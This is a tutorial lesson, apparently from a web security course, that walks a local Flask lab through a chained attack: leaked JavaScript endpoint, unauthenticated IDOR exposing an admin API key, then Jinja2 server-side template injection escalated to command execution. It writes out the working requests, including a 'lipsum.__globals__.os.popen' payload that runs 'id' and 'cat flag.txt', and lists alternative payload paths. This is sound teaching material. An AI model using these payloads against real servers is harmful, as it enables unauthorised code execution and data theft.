---
title: "Lesson 10.1: Chaining recon to RCE"
image:
  path: /assets/img/covers/web-10-1-chaining-recon-rce.webp
  alt: "Chaining recon to RCE"
date: 2024-06-15 18:05:00 +0700
categories: ["Web Security", "Web · Chaining"]
tags: [web, chaining, rce]
render_with_liquid: false
---

In real engagements (bug bounty, pentest, advanced CTF), a single vulnerability that leads straight to RCE is rare. What produces a "critical" report is usually a chain: several low or medium severity vulnerabilities linked together, where each link unlocks the next. This lesson teaches that chain mindset and runs a real recon to IDOR to SSTI to RCE chain on a multi-step Flask app.

![Chaining recon to RCE](/assets/img/web/web-10-1-chaining-recon-rce.svg)
_Recon leaks an internal endpoint, IDOR leaks an admin API key, the key unlocks an SSTI endpoint, and SSTI on Jinja2 is RCE._

Level: advanced, about 50 minutes. Prerequisites: Lesson 9.1 (REST API security), Lesson 5.1 (IDOR), Lesson 8.1 (SSTI). Tools: ffuf/gobuster, curl, Python requests, Burp Suite.

## Goals

After this lesson you understand why "low-score" vulnerabilities become critical when chained, you can practice the recon to leak to exploit to RCE flow, you know how to read JS files, comments, and API docs to find a hidden attack surface, and you can run a full attack chain and retrieve the flag on the server.

## Theory

In real engagements (bug bounty, pentest, advanced CTF), a single vulnerability that leads straight to RCE is rare. What produces a "critical" report is usually a **chain**: several low or medium severity vulnerabilities linked together, where each link unlocks the next.

A typical chain goes through these stages:

1. **Recon**: map the attack surface. Probe directories, read JavaScript files, HTML comments, API docs (Swagger/OpenAPI), and headers, to find hidden endpoints with no public link.
2. **Vulnerability A (entry point)**: a vulnerability that lets you read something you should not. A common one is IDOR/BOLA leaking information (credentials, an API key, an internal token).
3. **Leak**: use vulnerability A to obtain a secret, and that secret is the key for the next step.
4. **Vulnerability B (escalation)**: use the leaked secret to reach a more powerful function that is "protected" by that very secret. For example an admin endpoint with SSTI, or file upload, or deserialization.
5. **RCE**: turn vulnerability B into code execution, read the flag, or take over the server.

The chain mindset differs from the scan mindset. An automated scanner reports "IDOR, medium" and stops. The attacker asks a further question: what can I leak, and which door does that open? An API key that seems harmless can be the ticket into a template-rendering endpoint, a template render with no controls is SSTI, and SSTI on Jinja2 is RCE.

An important lesson when writing the report: always describe the full chain with the final impact, because that is the real risk level. And when fixing: breaking **one** link is enough to cut the chain, but you should fix all of them because of defense in depth.

## Demo

The lab in `labs/10.1/` sets up a multi-step "Shop Admin Portal". The chain has four links.

Link 0, recon. The home page is empty but embeds a JS file, and has a "forgot to remove" comment:

```text
GET /
...<!-- TODO: go bo file debug truoc khi len production -->
   <script src="/static/app.js"></script>

GET /static/app.js
...const API_BASE = "/api/v2";
   fetch(`${API_BASE}/users/${userId}/keys`)  // endpoint noi bo
```

The JS file just leaked the internal endpoint `/api/v2/users/<id>/keys`, which has no link in the UI. Link 1, IDOR. This endpoint is unauthenticated, so call it with `id=1` (admin):

```text
GET /api/v2/users/1/keys
-> {"id":1,"username":"admin","role":"admin",
    "admin_api_key":"adm_k3y_31337_internal", ...}
```

We just leaked `admin_api_key`. Link 2, SSTI. The endpoint `/admin/template/preview` is "protected" only by the key we just leaked, and it renders a user-supplied template. Try `{{7*7}}`:

```text
POST /admin/template/preview
X-Admin-Key: adm_k3y_31337_internal
{"template":"{{7*7}}"}
-> {"rendered":"49"}
```

The `49` confirms the server evaluates the expression, which is Server-Side Template Injection on Jinja2. Link 3, RCE. The classic Jinja2 payload to reach `os` and run a command:

```text
POST /admin/template/preview
X-Admin-Key: adm_k3y_31337_internal
{"template":"{{ lipsum.__globals__.os.popen('id; echo ---; cat flag.txt').read() }}"}

-> uid=1000(haipanda) gid=1000(Administrator) groups=...
   ---
   FLAG{10.1_recon_idor_ssti_rce_chain}
```

Four links, from a "forgot to remove" comment to command execution on the server.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 10.1</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-web/10.1.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-web/10.1/app.py" download><i class="fa-solid fa-file-code"></i>app.py</a>
<a class="lab-file" href="/assets/labs-web/10.1/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
</div>
</div>

- Vulnerable app: `labs/10.1/` (multi-step Flask, binds `127.0.0.1:8076`, runs locally from the lab directory per the README).
- Task: walk the full recon to RCE chain yourself and retrieve the contents of `flag.txt`.
- Hints:
  - Start by reading the HTML and every static file carefully. Do not skip comments.
  - When you see an internal endpoint, try changing the `id` (IDOR) before anything else.
  - Once you have the key, find which function accepts it. Try `{{7*7}}` to detect SSTI.
  - The Jinja2 RCE payload can go through `lipsum.__globals__`, `cycler.__init__.__globals__`, or `self.__init__.__globals__`.
- Solution: `exploit.py` and `transcript.txt` in `labs/10.1/`.

## Common pitfalls

- Treating a medium IDOR as done, missing that it leaks a secret leading to RCE.
- Thinking a secret in a URL or JS file is "safe because normal people do not see it". The attacker reads all of it.
- With SSTI, confusing XSS (runs in the browser) with SSTI (runs on the server). SSTI is far more dangerous.
- When writing the report, listing each flaw in isolation without reconstructing the chain, which leads the reader to underestimate the real risk.

## Further reading

- PortSwigger Web Security Academy: the Information disclosure, Access control, and SSTI topics (used to build chains).
- HackTricks: the SSTI payloads section for Jinja2 and other template engines.
- Real bug bounty writeups of the form "IDOR to account takeover", "info leak to RCE".

## Key takeaways

- Always ask the next question "what can I leak, and which door does that open"; do not stop at the first vulnerability.
- Recon is the first link: JS files, comments, Swagger, and headers often leak hidden endpoints.
- A leaked secret (an API key, a token) is rarely the goal; it is the key for the next step.
- Detect SSTI with a math expression (`{{7*7}}`), then escalate to RCE by reaching `os` through the globals of a function already available in the template.
- Breaking one link cuts the chain, but you should fix all of them.
